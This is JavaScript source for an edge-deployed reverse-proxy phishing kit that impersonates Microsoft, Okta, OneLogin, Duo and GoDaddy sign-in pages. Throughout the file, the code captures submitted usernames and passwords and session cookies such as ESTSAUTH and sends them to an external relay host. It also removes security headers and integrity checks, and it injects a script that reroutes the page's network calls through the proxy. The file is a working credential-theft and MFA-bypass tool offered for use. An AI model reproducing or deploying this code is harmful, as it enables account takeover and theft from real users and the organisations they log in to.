export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'gui.godaddy.com': { type: 'godaddy', name: 'GoDaddy GUI' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    const provider = IDENTITY_PROVIDERS[upstreamDomain];

    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }

  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    isProxied: false
  };
}

function cleanQueryString(search) {
  if (!search) return '';
  const params = new URLSearchParams(search);
  const pathValues = params.getAll('path');
  if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
    const cleaned = new URLSearchParams();
    for (const [key, value] of params) {
      if (key !== 'path') cleaned.append(key, value);
    }
    const result = cleaned.toString();
    return result ? '?' + result : '';
  }
  return search;
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') ||
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net') ||
      hostname.includes('gui.godaddy.com')) return true;
  if (hostname.includes('okta.com') || hostname.includes('onelogin.com') ||
      hostname.includes('duosecurity.com') || hostname.includes('wsimg.com')) return true;
  return false;
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    if (shouldProxyDomain(url.hostname)) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
    }
    return location;
  } catch (e) {
    return location;
  }
}

function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => p === '.*' || cookieString.toLowerCase().includes(p.toLowerCase()));
}

function parseCredentials(bodyText) {
  const keyValuePairs = bodyText.split('&');
  let user = null;
  let pass = null;
  for (const pair of keyValuePairs) {
    const [key, value] = pair.split('=');
    if (!value) continue;
    const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));
    if (['login', 'loginfmt', 'username', 'email', 'user'].includes(key)) user = decodedValue;
    if (['passwd', 'password', 'pwd', 'pass'].includes(key)) pass = decodedValue;
  }
  return { user, pass };
}

// ==================== CLIENT-SIDE INTERCEPTOR ====================
function generateInterceptorScript(upstreamDomain, currentPath) {
  const pathWithoutQuery = currentPath.split('?')[0];
  const pathSegments = pathWithoutQuery.split('/').filter(Boolean);
  const baseSegment = pathSegments.length > 0 ? pathSegments[0] : '';
  const basePath = baseSegment ? '/' + baseSegment + '/' : '/';

  return `
<script>
(function() {
  'use strict';
  try {
    const PROXY_PREFIX = '${PROXY_PREFIX}';
    const YOUR_DOMAIN = '${YOUR_DOMAIN}';
    const CURRENT_UPSTREAM = '${upstreamDomain}';
    const CURRENT_BASE_PATH = '${basePath}';

    function shouldProxyDomain(hostname) {
      if (!hostname) return false;
      return /godaddy|secureserver|wsimg|microsoft|live|office|msauth/.test(hostname);
    }

    function rewriteUrl(url) {
      if (!url || typeof url !== 'string' || url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;
      if (/^data:|^blob:|^javascript:|^#/.test(url)) return url;

      // Silently drop known tracking requests that cause adblock noise
      if (/eventbus\/web|rum\/events|apm\//.test(url)) {
        console.log('[Proxy Interceptor] Blocked tracking:', url);
        return 'about:blank';
      }

      try {
        if (url.startsWith('http')) {
          const u = new URL(url);
          if (shouldProxyDomain(u.hostname)) {
            return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + u.hostname + u.pathname + u.search + u.hash;
          }
        } else if (url.startsWith('//')) {
          const h = url.split('/')[2];
          if (shouldProxyDomain(h)) return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + h + url.substring(2 + h.length);
        } else if (url.startsWith('/')) {
          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + url;
        }
      } catch(e) {}
      return url;
    }

    // Overrides
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
      const rewritten = typeof url === 'string' ? rewriteUrl(url) : url;
      return originalFetch.call(this, rewritten, options);
    };

    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
      const rewritten = rewriteUrl(url);
      return originalOpen.call(this, method, rewritten, async, user, password);
    };

    if (window.WebSocket) {
      const originalWS = window.WebSocket;
      window.WebSocket = function(url, protocols) {
        return new originalWS(rewriteUrl(url), protocols);
      };
    }

    // Service Worker block
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register = () => Promise.resolve({ active: null, installing: null, waiting: null });
    }

    console.log('[Proxy Interceptor] Initialized for', CURRENT_UPSTREAM);
  } catch(err) {
    console.error('[Proxy Interceptor] Init failed:', err);
  }
})();
</script>`;
}

// ==================== MAIN HANDLER (Improved POST handling) ====================
export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  const cleanSearch = cleanQueryString(url.search);
  const upstreamPath = info.path + cleanSearch;
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
  const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;

  console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);

  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': '*',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  const headers = new Headers(request.headers);
  headers.set('Host', upstreamDomain);
  headers.set('Referer', `https://${upstreamDomain}/`);
  headers.set('Origin', `https://${upstreamDomain}`);
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');

  let requestBodyForUpstream = null;

  if (['POST', 'PUT', 'PATCH'].includes(request.method)) {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();

      const { user, pass } = parseCredentials(bodyText);
      if (user && pass) {
        console.log(`[CREDENTIALS CAPTURED] ${user.substring(0, 5)}... -> ${info.type}`);
        await sendToVercel('credentials', { type: "creds", ip, user, pass, platform: info.type, url: displayUrl });
      }

      requestBodyForUpstream = bodyText;
    } catch (e) {
      console.error('Body read error:', e);
      requestBodyForUpstream = request.body;
    }
  }

  try {
    const fetchOpts = {
      method: request.method,
      headers,
      redirect: 'manual'
    };

    if (requestBodyForUpstream !== null) {
      fetchOpts.body = requestBodyForUpstream;
      fetchOpts.duplex = 'half';
    } else if (!['GET', 'HEAD'].includes(request.method)) {
      fetchOpts.body = request.body;
      fetchOpts.duplex = 'half';
    }

    const resp = await fetch(upstreamUrl, fetchOpts);

    // Redirect handling
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) return new Response(null, { status: resp.status, headers: { Location: rewriteLocation(loc) } });
    }

    const newHeaders = new Headers(resp.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    newHeaders.set('access-control-allow-headers', '*');

    // Remove security headers
    ['content-security-policy', 'strict-transport-security', 'x-frame-options', 'referrer-policy', 'permissions-policy'].forEach(h => newHeaders.delete(h));

    // Cookie handling
    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
    let cookieStr = '';
    if (cookies.length) {
      cookieStr = cookies.join('; ');
      const shouldCapture = request.method === 'POST' || hasCriticalAuthCookies(cookieStr, info.type);

      cookies.forEach(c => {
        if (!c) return;
        let mod = c.replace(/Domain=[^;]+;?/gi, '')
                   .replace(/Secure;?/gi, '')
                   .replace(/SameSite=[^;]+;?/gi, '');
        mod += '; SameSite=None; Secure';
        newHeaders.append('Set-Cookie', mod);
      });

      if (shouldCapture && cookieStr) {
        await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
      }
    }

    const ct = resp.headers.get('content-type') || '';

    if (/text\/html|application\/javascript|application\/json|text\/javascript|text\/css/.test(ct)) {
      let text = await resp.text();

      if (ct.includes('text/html')) {
        const interceptor = generateInterceptorScript(upstreamDomain, info.path);
        if (text.includes('<head>')) text = text.replace('<head>', `<head>${interceptor}`);
        else if (text.includes('<html>')) text = text.replace('<html>', `<html>${interceptor}`);
        else text = interceptor + text;
      }

      // Absolute URL rewriting
      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
        const escaped = domain.replace(/\./g, '\\.');
        text = text.replace(new RegExp('https?://' + escaped + '([^"\'`\\s)]*)', 'gi'),
          `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}$1`);
      });

      if (ct.includes('text/html')) {
        // SRI removal
        text = text.replace(/<(script|link)[^>]*?\s+integrity=["'][^"']*["'][^>]*>/gi, m => m.replace(/\s+integrity=["'][^"']*["']/i, ''));

        // Root-relative
        text = text.replace(/(src|href|action)=["']\/([^"']+)["']/gi, (m, attr, p) => {
          if (p.startsWith('_p/') || p.startsWith('data:') || p.startsWith('blob:') || p.startsWith('#')) return m;
          return `${attr}="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/${p}"`;
        });

        // GoDaddy 404 cleanup + Next.js assets
        text = text.replace(/\/id-id\/godaddy-404/gi, '/');
        text = text.replace(/godaddy-404/gi, '');

        text = text.replace(/(src|href)=["']\/_next\/static\/([^"']+)["']/gi,
          `\$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/_next/static/$2"`);

        text = text.replace(/\/_next\/static\/media\/([^"'\s)]+\.png)/gi,
          `https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/_next/static/media/$1`);
      }

      // CSS
      text = text.replace(/url\(["']?(https?:\/\/[^"')]+)["']?\)/gi, (m, u) => {
        try {
          const uu = new URL(u);
          if (shouldProxyDomain(uu.hostname)) return `ur[](https://${YOUR_DOMAIN}${PROXY_PREFIX}${uu.hostname}${uu.pathname}${uu.search})`;
        } catch(e) {}
        return m;
      });

      return new Response(text, { status: resp.status, headers: newHeaders });
    }

    return new Response(resp.body, { status: resp.status, headers: newHeaders });

  } catch (err) {
    console.error(`[${info.type}] Proxy Error:`, err.message);
    return new Response(JSON.stringify({ error: 'Proxy Error', message: err.message }), {
      status: 502,
      headers: { 'content-type': 'application/json' }
    });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
